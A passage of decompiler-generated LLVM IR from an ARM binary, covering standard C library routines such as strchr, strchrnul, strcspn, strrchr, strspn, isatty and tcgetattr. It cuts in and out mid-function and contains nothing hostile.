  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 0, 27, 2, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 5, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_177d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17764, { 2, 0, 1 }
  uselistorder label %dec_label_pc_176f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17698, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_17624, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_175e8, { 1, 0 }
  uselistorder label %dec_label_pc_175d4, { 1, 0 }
  uselistorder label %dec_label_pc_17594, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17528, { 2, 0, 1 }
  uselistorder label %dec_label_pc_174bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1745c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1742c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_173c8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_17388, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_177f4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_177f4 = phi i32 [ %v0_177f4.pre, %bb ], [ %v5_177f4, %bb3 ]
  %v0_177f0 = phi i32 [ %tmp, %bb ], [ %v5_177f0, %bb3 ]
  %v1_177f0 = inttoptr i32 %v0_177f0 to i8*
  %v2_177f0 = load i8, i8* %v1_177f0, align 1
  %v1_177f4 = inttoptr i32 %v0_177f4 to i8*
  %v2_177f4 = load i8, i8* %v1_177f4, align 1
  %v3_177f4 = zext i8 %v2_177f4 to i32
  %v2_177f8 = icmp eq i8 %v2_177f0, 0
  br i1 %v2_177f8, label %.dec_label_pc_17804_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_177f4 = add i32 %v0_177f4, 1
  %v5_177f0 = add i32 %v0_177f0, 1
  %v3_177f0 = zext i8 %v2_177f0 to i32
  %v10_177fc = icmp eq i8 %v2_177f0, %v2_177f4
  br i1 %v10_177fc, label %entry, label %dec_label_pc_17804

.dec_label_pc_17804_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17804

dec_label_pc_17804:                               ; preds = %bb3, %.dec_label_pc_17804_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_17804_crit_edge ], [ %v3_177f0, %bb3 ]
  %v2_17804.pre-phi = sub nsw i32 %.pn, %v3_177f4
  ret i32 %v2_17804.pre-phi

; uselistorder directives
  uselistorder i8 %v2_177f0, { 0, 2, 1 }
  uselistorder i32 %v0_177f0, { 1, 0 }
  uselistorder i32 %v0_177f4, { 1, 0 }
  uselistorder label %dec_label_pc_17804, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_17874 = urem i32 %arg1, 256
  %v0_178943 = load i32, i32* @r0, align 4
  %v1_178944 = urem i32 %v0_178943, 4
  %v2_178945 = icmp eq i32 %v1_178944, 0
  br i1 %v2_178945, label %dec_label_pc_1789c, label %dec_label_pc_1787c

dec_label_pc_1787c:                               ; preds = %entry, %dec_label_pc_17890
  %v0_17890 = phi i32 [ %v1_17890, %dec_label_pc_17890 ], [ %v0_178943, %entry ]
  %v1_1787c = inttoptr i32 %v0_17890 to i8*
  %v2_1787c = load i8, i8* %v1_1787c, align 1
  %v3_1787c = zext i8 %v2_1787c to i32
  %v9_17880 = icmp eq i32 %v3_1787c, %v1_17874
  br i1 %v9_17880, label %dec_label_pc_17950, label %dec_label_pc_17888

dec_label_pc_17888:                               ; preds = %dec_label_pc_1787c
  %v2_17888 = icmp eq i8 %v2_1787c, 0
  br i1 %v2_17888, label %dec_label_pc_1794c, label %dec_label_pc_17890

dec_label_pc_17890:                               ; preds = %dec_label_pc_17888
  %v1_17890 = add i32 %v0_17890, 1
  %v1_17894 = urem i32 %v1_17890, 4
  %v2_17894 = icmp eq i32 %v1_17894, 0
  br i1 %v2_17894, label %dec_label_pc_1789c, label %dec_label_pc_1787c

dec_label_pc_1789c:                               ; preds = %dec_label_pc_17890, %entry
  %v0_178a0 = phi i32 [ %v0_178943, %entry ], [ %v1_17890, %dec_label_pc_17890 ]
  %v4_1789c = mul nuw nsw i32 %v1_17874, 256
  %v5_1789c = or i32 %v4_1789c, %v1_17874
  %v4_178a4 = mul i32 %v5_1789c, 65536
  %v5_178a4 = or i32 %v4_178a4, %v5_1789c
  br label %dec_label_pc_178a8

dec_label_pc_178a8:                               ; preds = %dec_label_pc_17944, %dec_label_pc_178e4, %dec_label_pc_1789c
  %v0_1790c = phi i32 [ %v0_178a0, %dec_label_pc_1789c ], [ %v4_178a8, %dec_label_pc_178e4 ], [ %v4_178a8, %dec_label_pc_17944 ]
  %v1_178a8 = inttoptr i32 %v0_1790c to i32*
  %v2_178a8 = load i32, i32* %v1_178a8, align 4
  %v4_178a8 = add i32 %v0_1790c, 4
  %v2_178b0 = xor i32 %v2_178a8, %v5_178a4
  %v2_178bc = add i32 %v2_178a8, 2130640639
  %v1_178c0 = sub i32 -1, %v2_178a8
  %v2_178c4 = xor i32 %v2_178bc, %v1_178c0
  %v2_178d0 = and i32 %v2_178c4, -2130640640
  store i32 %v2_178d0, i32* @r1, align 4
  %v2_178d8 = icmp eq i32 %v2_178d0, 0
  br i1 %v2_178d8, label %dec_label_pc_178e4, label %dec_label_pc_178ec

dec_label_pc_178e4:                               ; preds = %dec_label_pc_178a8
  %v2_178b4 = add i32 %v2_178b0, 2130640639
  %v1_178cc = sub i32 -1, %v2_178b0
  %v2_178d4 = xor i32 %v2_178b4, %v1_178cc
  %v2_178dc = and i32 %v2_178d4, -2130640640
  %v2_178e4 = icmp eq i32 %v2_178dc, 0
  br i1 %v2_178e4, label %dec_label_pc_178a8, label %dec_label_pc_178ec

dec_label_pc_178ec:                               ; preds = %dec_label_pc_178a8, %dec_label_pc_178e4
  %v2_178ec = inttoptr i32 %v0_1790c to i8*
  %v3_178ec = load i8, i8* %v2_178ec, align 1
  %v4_178ec = zext i8 %v3_178ec to i32
  %v9_178f0 = icmp eq i32 %v4_178ec, %v1_17874
  br i1 %v9_178f0, label %dec_label_pc_17950, label %dec_label_pc_178fc

dec_label_pc_178fc:                               ; preds = %dec_label_pc_178ec
  %v2_178fc = icmp eq i8 %v3_178ec, 0
  br i1 %v2_178fc, label %dec_label_pc_1794c, label %dec_label_pc_17904

dec_label_pc_17904:                               ; preds = %dec_label_pc_178fc
  %v1_17904 = add i32 %v0_1790c, 1
  %v2_17904 = inttoptr i32 %v1_17904 to i8*
  %v3_17904 = load i8, i8* %v2_17904, align 1
  %v4_17904 = zext i8 %v3_17904 to i32
  %v9_17908 = icmp eq i32 %v4_17904, %v1_17874
  br i1 %v9_17908, label %dec_label_pc_17950, label %dec_label_pc_17914

dec_label_pc_17914:                               ; preds = %dec_label_pc_17904
  %v2_17914 = icmp eq i8 %v3_17904, 0
  br i1 %v2_17914, label %dec_label_pc_1794c, label %dec_label_pc_1791c

dec_label_pc_1791c:                               ; preds = %dec_label_pc_17914
  %v1_1791c = add i32 %v0_1790c, 2
  %v2_1791c = inttoptr i32 %v1_1791c to i8*
  %v3_1791c = load i8, i8* %v2_1791c, align 1
  %v4_1791c = zext i8 %v3_1791c to i32
  %v9_17920 = icmp eq i32 %v4_1791c, %v1_17874
  br i1 %v9_17920, label %dec_label_pc_17950, label %dec_label_pc_1792c

dec_label_pc_1792c:                               ; preds = %dec_label_pc_1791c
  %v2_1792c = icmp eq i8 %v3_1791c, 0
  br i1 %v2_1792c, label %dec_label_pc_1794c, label %dec_label_pc_17934

dec_label_pc_17934:                               ; preds = %dec_label_pc_1792c
  %v1_17934 = add i32 %v0_1790c, 3
  %v2_17934 = inttoptr i32 %v1_17934 to i8*
  %v3_17934 = load i8, i8* %v2_17934, align 1
  %v4_17934 = zext i8 %v3_17934 to i32
  %v9_17938 = icmp eq i32 %v4_17934, %v1_17874
  br i1 %v9_17938, label %dec_label_pc_17950, label %dec_label_pc_17944

dec_label_pc_17944:                               ; preds = %dec_label_pc_17934
  %v2_17944 = icmp eq i8 %v3_17934, 0
  br i1 %v2_17944, label %dec_label_pc_1794c, label %dec_label_pc_178a8

dec_label_pc_1794c:                               ; preds = %dec_label_pc_17888, %dec_label_pc_17944, %dec_label_pc_1792c, %dec_label_pc_17914, %dec_label_pc_178fc
  br label %dec_label_pc_17950

dec_label_pc_17950:                               ; preds = %dec_label_pc_1787c, %dec_label_pc_17934, %dec_label_pc_1791c, %dec_label_pc_17904, %dec_label_pc_178ec, %dec_label_pc_1794c
  %v1_17954 = phi i32 [ 0, %dec_label_pc_1794c ], [ %v1_17934, %dec_label_pc_17934 ], [ %v1_1791c, %dec_label_pc_1791c ], [ %v1_17904, %dec_label_pc_17904 ], [ %v0_1790c, %dec_label_pc_178ec ], [ %v0_17890, %dec_label_pc_1787c ]
  ret i32 %v1_17954

; uselistorder directives
  uselistorder i32 %v4_178a8, { 1, 0 }
  uselistorder i32 %v2_178a8, { 0, 2, 1 }
  uselistorder i32 %v0_1790c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1789c, { 1, 0 }
  uselistorder i32 %v1_17890, { 1, 0, 2 }
  uselistorder i32 %v0_178943, { 2, 1, 0 }
  uselistorder i32 %v1_17874, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_17950, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1794c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_178ec, { 1, 0 }
  uselistorder label %dec_label_pc_1787c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_17964 = urem i32 %arg1, 256
  %v0_179842 = load i32, i32* @r0, align 4
  %v1_179843 = urem i32 %v0_179842, 4
  %v2_179844 = icmp eq i32 %v1_179843, 0
  br i1 %v2_179844, label %dec_label_pc_1798c, label %dec_label_pc_1796c

dec_label_pc_1796c:                               ; preds = %entry, %dec_label_pc_17980
  %v0_17980 = phi i32 [ %v1_17980, %dec_label_pc_17980 ], [ %v0_179842, %entry ]
  %v1_1796c = inttoptr i32 %v0_17980 to i8*
  %v2_1796c = load i8, i8* %v1_1796c, align 1
  %v3_1796c = zext i8 %v2_1796c to i32
  %v9_17970 = icmp eq i32 %v3_1796c, %v1_17964
  br i1 %v9_17970, label %dec_label_pc_17a3c, label %dec_label_pc_17978

dec_label_pc_17978:                               ; preds = %dec_label_pc_1796c
  %v2_17978 = icmp eq i8 %v2_1796c, 0
  br i1 %v2_17978, label %dec_label_pc_17a3c, label %dec_label_pc_17980

dec_label_pc_17980:                               ; preds = %dec_label_pc_17978
  %v1_17980 = add i32 %v0_17980, 1
  %v1_17984 = urem i32 %v1_17980, 4
  %v2_17984 = icmp eq i32 %v1_17984, 0
  br i1 %v2_17984, label %dec_label_pc_1798c, label %dec_label_pc_1796c

dec_label_pc_1798c:                               ; preds = %dec_label_pc_17980, %entry
  %v0_17990 = phi i32 [ %v0_179842, %entry ], [ %v1_17980, %dec_label_pc_17980 ]
  %v4_1798c = mul nuw nsw i32 %v1_17964, 256
  %v5_1798c = or i32 %v4_1798c, %v1_17964
  %v4_17994 = mul i32 %v5_1798c, 65536
  %v5_17994 = or i32 %v4_17994, %v5_1798c
  br label %dec_label_pc_17998

dec_label_pc_17998:                               ; preds = %dec_label_pc_17a34, %dec_label_pc_179d4, %dec_label_pc_1798c
  %v0_179fc = phi i32 [ %v0_17990, %dec_label_pc_1798c ], [ %v4_17998, %dec_label_pc_179d4 ], [ %v4_17998, %dec_label_pc_17a34 ]
  %v1_17998 = inttoptr i32 %v0_179fc to i32*
  %v2_17998 = load i32, i32* %v1_17998, align 4
  %v4_17998 = add i32 %v0_179fc, 4
  %v2_179a0 = xor i32 %v2_17998, %v5_17994
  %v2_179ac = add i32 %v2_17998, 2130640639
  %v1_179b0 = sub i32 -1, %v2_17998
  %v2_179b4 = xor i32 %v2_179ac, %v1_179b0
  %v2_179c0 = and i32 %v2_179b4, -2130640640
  store i32 %v2_179c0, i32* @r1, align 4
  %v2_179c8 = icmp eq i32 %v2_179c0, 0
  br i1 %v2_179c8, label %dec_label_pc_179d4, label %dec_label_pc_179dc

dec_label_pc_179d4:                               ; preds = %dec_label_pc_17998
  %v2_179a4 = add i32 %v2_179a0, 2130640639
  %v1_179bc = sub i32 -1, %v2_179a0
  %v2_179c4 = xor i32 %v2_179a4, %v1_179bc
  %v2_179cc = and i32 %v2_179c4, -2130640640
  %v2_179d4 = icmp eq i32 %v2_179cc, 0
  br i1 %v2_179d4, label %dec_label_pc_17998, label %dec_label_pc_179dc

dec_label_pc_179dc:                               ; preds = %dec_label_pc_17998, %dec_label_pc_179d4
  %v2_179dc = inttoptr i32 %v0_179fc to i8*
  %v3_179dc = load i8, i8* %v2_179dc, align 1
  %v4_179dc = zext i8 %v3_179dc to i32
  %v9_179e0 = icmp eq i32 %v4_179dc, %v1_17964
  br i1 %v9_179e0, label %dec_label_pc_17a3c, label %dec_label_pc_179ec

dec_label_pc_179ec:                               ; preds = %dec_label_pc_179dc
  %v2_179ec = icmp eq i8 %v3_179dc, 0
  br i1 %v2_179ec, label %dec_label_pc_17a3c, label %dec_label_pc_179f4

dec_label_pc_179f4:                               ; preds = %dec_label_pc_179ec
  %v1_179f4 = add i32 %v0_179fc, 1
  %v2_179f4 = inttoptr i32 %v1_179f4 to i8*
  %v3_179f4 = load i8, i8* %v2_179f4, align 1
  %v4_179f4 = zext i8 %v3_179f4 to i32
  %v9_179f8 = icmp eq i32 %v4_179f4, %v1_17964
  br i1 %v9_179f8, label %dec_label_pc_17a3c, label %dec_label_pc_17a04

dec_label_pc_17a04:                               ; preds = %dec_label_pc_179f4
  %v2_17a04 = icmp eq i8 %v3_179f4, 0
  br i1 %v2_17a04, label %dec_label_pc_17a3c, label %dec_label_pc_17a0c

dec_label_pc_17a0c:                               ; preds = %dec_label_pc_17a04
  %v1_17a0c = add i32 %v0_179fc, 2
  %v2_17a0c = inttoptr i32 %v1_17a0c to i8*
  %v3_17a0c = load i8, i8* %v2_17a0c, align 1
  %v4_17a0c = zext i8 %v3_17a0c to i32
  %v9_17a10 = icmp eq i32 %v4_17a0c, %v1_17964
  br i1 %v9_17a10, label %dec_label_pc_17a3c, label %dec_label_pc_17a1c

dec_label_pc_17a1c:                               ; preds = %dec_label_pc_17a0c
  %v2_17a1c = icmp eq i8 %v3_17a0c, 0
  br i1 %v2_17a1c, label %dec_label_pc_17a3c, label %dec_label_pc_17a24

dec_label_pc_17a24:                               ; preds = %dec_label_pc_17a1c
  %v1_17a24 = add i32 %v0_179fc, 3
  %v2_17a24 = inttoptr i32 %v1_17a24 to i8*
  %v3_17a24 = load i8, i8* %v2_17a24, align 1
  %v4_17a24 = zext i8 %v3_17a24 to i32
  %v9_17a28 = icmp eq i32 %v4_17a24, %v1_17964
  br i1 %v9_17a28, label %dec_label_pc_17a3c, label %dec_label_pc_17a34

dec_label_pc_17a34:                               ; preds = %dec_label_pc_17a24
  %v2_17a34 = icmp eq i8 %v3_17a24, 0
  br i1 %v2_17a34, label %dec_label_pc_17a3c, label %dec_label_pc_17998

dec_label_pc_17a3c:                               ; preds = %dec_label_pc_17978, %dec_label_pc_1796c, %dec_label_pc_17a34, %dec_label_pc_17a24, %dec_label_pc_17a1c, %dec_label_pc_17a0c, %dec_label_pc_17a04, %dec_label_pc_179f4, %dec_label_pc_179ec, %dec_label_pc_179dc
  %v1_17a40 = phi i32 [ %v1_17a24, %dec_label_pc_17a34 ], [ %v1_17a24, %dec_label_pc_17a24 ], [ %v1_17a0c, %dec_label_pc_17a1c ], [ %v1_17a0c, %dec_label_pc_17a0c ], [ %v1_179f4, %dec_label_pc_17a04 ], [ %v1_179f4, %dec_label_pc_179f4 ], [ %v0_179fc, %dec_label_pc_179ec ], [ %v0_179fc, %dec_label_pc_179dc ], [ %v0_17980, %dec_label_pc_1796c ], [ %v0_17980, %dec_label_pc_17978 ]
  ret i32 %v1_17a40

; uselistorder directives
  uselistorder i32 %v4_17998, { 1, 0 }
  uselistorder i32 %v2_17998, { 0, 2, 1 }
  uselistorder i32 %v0_179fc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1798c, { 1, 0 }
  uselistorder i32 %v1_17980, { 1, 0, 2 }
  uselistorder i32 %v0_179842, { 2, 1, 0 }
  uselistorder i32 %v1_17964, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_17a3c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_179dc, { 1, 0 }
  uselistorder label %dec_label_pc_1796c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_17a4c = load i32, i32* @r4, align 4
  store i32 %v3_17a4c, i32* %stack_var_-16, align 4
  %v6_17a4c = load i32, i32* @r5, align 4
  %v9_17a4c = load i32, i32* @r6, align 4
  %v0_17a50 = load i32, i32* @r0, align 4
  %v0_17a54 = load i32, i32* @r1, align 4
  store i32 %v0_17a54, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_17a708 = inttoptr i32 %v0_17a50 to i8*
  %v2_17a709 = load i8, i8* %v1_17a708, align 1
  %v3_17a7010 = zext i8 %v2_17a709 to i32
  store i32 %v3_17a7010, i32* @r1, align 4
  %v2_17a7411 = icmp eq i8 %v2_17a709, 0
  store i32 %v0_17a54, i32* @r0, align 4
  %v1_17a7c12 = add i32 %v0_17a50, 1
  store i32 %v1_17a7c12, i32* @r4, align 4
  br i1 %v2_17a7411, label %dec_label_pc_17a84, label %dec_label_pc_17a60

dec_label_pc_17a60:                               ; preds = %entry, %dec_label_pc_17a6c
  %v3_17a7014 = phi i32 [ %v3_17a70, %dec_label_pc_17a6c ], [ %v3_17a7010, %entry ]
  %v0_17a7813 = phi i32 [ %v0_17a78.pre, %dec_label_pc_17a6c ], [ %v0_17a54, %entry ]
  %v2_17a60 = call i32 @__GI_strchr(i32 %v0_17a7813, i32 %v3_17a7014)
  %v2_17a64 = icmp eq i32 %v2_17a60, 0
  %v0_17a6c = load i32, i32* @r5, align 4
  br i1 %v2_17a64, label %dec_label_pc_17a6c, label %dec_label_pc_17a84

dec_label_pc_17a6c:                               ; preds = %dec_label_pc_17a60
  %v1_17a6c = add i32 %v0_17a6c, 1
  %v0_17a70.pre = load i32, i32* @r4, align 4
  %v0_17a78.pre = load i32, i32* @r6, align 4
  store i32 %v1_17a6c, i32* @r5, align 4
  %v1_17a70 = inttoptr i32 %v0_17a70.pre to i8*
  %v2_17a70 = load i8, i8* %v1_17a70, align 1
  %v3_17a70 = zext i8 %v2_17a70 to i32
  store i32 %v3_17a70, i32* @r1, align 4
  %v2_17a74 = icmp eq i8 %v2_17a70, 0
  store i32 %v0_17a78.pre, i32* @r0, align 4
  %v1_17a7c = add i32 %v0_17a70.pre, 1
  store i32 %v1_17a7c, i32* @r4, align 4
  br i1 %v2_17a74, label %dec_label_pc_17a84, label %dec_label_pc_17a60

dec_label_pc_17a84:                               ; preds = %dec_label_pc_17a6c, %dec_label_pc_17a60, %entry
  %v0_17a84 = phi i32 [ 0, %entry ], [ %v0_17a6c, %dec_label_pc_17a60 ], [ %v1_17a6c, %dec_label_pc_17a6c ]
  %v2_17a88 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17a88, i32* @r4, align 4
  store i32 %v6_17a4c, i32* @r5, align 4
  store i32 %v9_17a4c, i32* @r6, align 4
  ret i32 %v0_17a84

; uselistorder directives
  uselistorder i32 %v3_17a70, { 1, 0 }
  uselistorder i32 %v0_17a78.pre, { 1, 0 }
  uselistorder i32 %v0_17a70.pre, { 1, 0 }
  uselistorder label %dec_label_pc_17a60, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17a94 = urem i32 %arg2, 256
  store i32 %v1_17a94, i32* @r4, align 4
  %v2_17a94 = icmp eq i32 %v1_17a94, 0
  br i1 %v2_17a94, label %dec_label_pc_17aa8, label %dec_label_pc_17abc.preheader

dec_label_pc_17abc.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17ac43 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_17a94)
  %v2_17ac85 = icmp eq i32 %v2_17ac43, 0
  br i1 %v2_17ac85, label %dec_label_pc_17ad0, label %dec_label_pc_17ab4

dec_label_pc_17aa8:                               ; preds = %entry
  %v2_17aac = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_17ad4

dec_label_pc_17ab4:                               ; preds = %dec_label_pc_17abc.preheader, %dec_label_pc_17ab4
  %v2_17ac46 = phi i32 [ %v2_17ac4, %dec_label_pc_17ab4 ], [ %v2_17ac43, %dec_label_pc_17abc.preheader ]
  store i32 %v2_17ac46, i32* @r5, align 4
  %v1_17ab8 = add i32 %v2_17ac46, 1
  store i32 %v1_17ab8, i32* @r0, align 4
  %v0_17ac0 = load i32, i32* @r4, align 4
  %v2_17ac4 = call i32 @__GI_strchr(i32 %v1_17ab8, i32 %v0_17ac0)
  %v2_17ac8 = icmp eq i32 %v2_17ac4, 0
  br i1 %v2_17ac8, label %dec_label_pc_17ad0, label %dec_label_pc_17ab4

dec_label_pc_17ad0:                               ; preds = %dec_label_pc_17ab4, %dec_label_pc_17abc.preheader
  %v0_17ad0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17ad4

dec_label_pc_17ad4:                               ; preds = %dec_label_pc_17aa8, %dec_label_pc_17ad0
  %storemerge = phi i32 [ %v2_17aac, %dec_label_pc_17aa8 ], [ %v0_17ad0, %dec_label_pc_17ad0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17ac4, { 1, 0 }
  uselistorder i32 %v1_17ab8, { 1, 0 }
  uselistorder i32 %v1_17a94, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17ad4, { 1, 0 }
  uselistorder label %dec_label_pc_17ab4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_17b102 = load i32, i32* @r0, align 4
  %v1_17b103 = inttoptr i32 %v0_17b102 to i8*
  %v2_17b104 = load i8, i8* %v1_17b103, align 1
  %v2_17b146 = icmp eq i8 %v2_17b104, 0
  br i1 %v2_17b146, label %dec_label_pc_17b20, label %dec_label_pc_17af4.preheader

dec_label_pc_17aec:                               ; preds = %dec_label_pc_17af4
  %v1_17afc = add i32 %v0_17afc, 1
  %v9_17aec = icmp eq i8 %v0_17aec10.in, %v2_17af4
  br i1 %v9_17aec, label %dec_label_pc_17b08, label %dec_label_pc_17af4

dec_label_pc_17af4:                               ; preds = %dec_label_pc_17af4.preheader, %dec_label_pc_17aec
  %v0_17afc = phi i32 [ %tmp, %dec_label_pc_17af4.preheader ], [ %v1_17afc, %dec_label_pc_17aec ]
  %v1_17af4 = inttoptr i32 %v0_17afc to i8*
  %v2_17af4 = load i8, i8* %v1_17af4, align 1
  %v2_17af8 = icmp eq i8 %v2_17af4, 0
  br i1 %v2_17af8, label %dec_label_pc_17b20, label %dec_label_pc_17aec

dec_label_pc_17b08:                               ; preds = %dec_label_pc_17aec
  %v1_17b08 = add i32 %v0_17b08, 1
  %v1_17b0c = add i32 %v0_17b0c, 1
  %v1_17b10 = inttoptr i32 %v1_17b0c to i8*
  %v2_17b10 = load i8, i8* %v1_17b10, align 1
  %v2_17b14 = icmp eq i8 %v2_17b10, 0
  br i1 %v2_17b14, label %dec_label_pc_17b20, label %dec_label_pc_17af4.preheader

dec_label_pc_17af4.preheader:                     ; preds = %entry, %dec_label_pc_17b08
  %v0_17b0c = phi i32 [ %v1_17b0c, %dec_label_pc_17b08 ], [ %v0_17b102, %entry ]
  %v0_17b08 = phi i32 [ %v1_17b08, %dec_label_pc_17b08 ], [ 0, %entry ]
  %v0_17aec10.in = phi i8 [ %v2_17b10, %dec_label_pc_17b08 ], [ %v2_17b104, %entry ]
  br label %dec_label_pc_17af4

dec_label_pc_17b20:                               ; preds = %dec_label_pc_17b08, %dec_label_pc_17af4, %entry
  %v0_17b20 = phi i32 [ 0, %entry ], [ %v0_17b08, %dec_label_pc_17af4 ], [ %v1_17b08, %dec_label_pc_17b08 ]
  ret i32 %v0_17b20

; uselistorder directives
  uselistorder i8 %v2_17af4, { 1, 0 }
  uselistorder i32 %v0_17afc, { 1, 0 }
  uselistorder label %dec_label_pc_17af4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_17b34 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17b34, i32* @r1, align 4
  %v0_17b38 = call i32 @__GI_tcgetattr()
  %v1_17b3c = sub i32 1, %v0_17b38
  %v2_17b3c = icmp ult i32 %v0_17b38, 2
  br i1 %v2_17b3c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_17b4c = phi i32 [ %v1_17b3c, %entry ], [ 0, %bb ]
  ret i32 %v1_17b4c

; uselistorder directives
  uselistorder i32 %v0_17b38, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_17b50 = load i32, i32* @r4, align 4
  %v6_17b50 = load i32, i32* @r5, align 4
  %v9_17b50 = load i32, i32* @r6, align 4
  %v2_17b58 = ptrtoint i32* %stack_var_-52 to i32
  %v0_17b5c = load i32, i32* @r1, align 4
  store i32 %v0_17b5c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_17b68 = load i32, i32* @r0, align 4
  %v3_17b68 = call i32 @ioctl(i32 %v0_17b68, i32 21505, i32 %v2_17b58)
  store i32 %v3_17b68, i32* %r0.global-to-local, align 4
  store i32 %v3_17b68, i32* @r5, align 4
  %v2_17b6c = icmp eq i32 %v3_17b68, 0
  br i1 %v2_17b6c, label %dec_label_pc_17b74, label %dec_label_pc_17bb8

dec_label_pc_17b74:                               ; preds = %entry
  %v4_17b80 = zext i8 %tmp to i32
  store i32 %v4_17b80, i32* @ip, align 4
  %v3_17b84 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17b84, i32* @r3, align 4
  %v1_17b88 = load i32, i32* @r4, align 4
  %v2_17b88 = add i32 %v1_17b88, 4
  %v3_17b88 = inttoptr i32 %v2_17b88 to i32*
  %v0_17b8c = load i32, i32* %r1.global-to-local, align 4
  %v1_17b8c = load i32, i32* @r4, align 4
  %v2_17b8c = add i32 %v1_17b8c, 8
  %v3_17b8c = inttoptr i32 %v2_17b8c to i32*
  store i32 %v0_17b8c, i32* %v3_17b8c, align 4
  %v0_17b90 = load i32, i32* %r0.global-to-local, align 4
  %v1_17b90 = load i32, i32* @r4, align 4
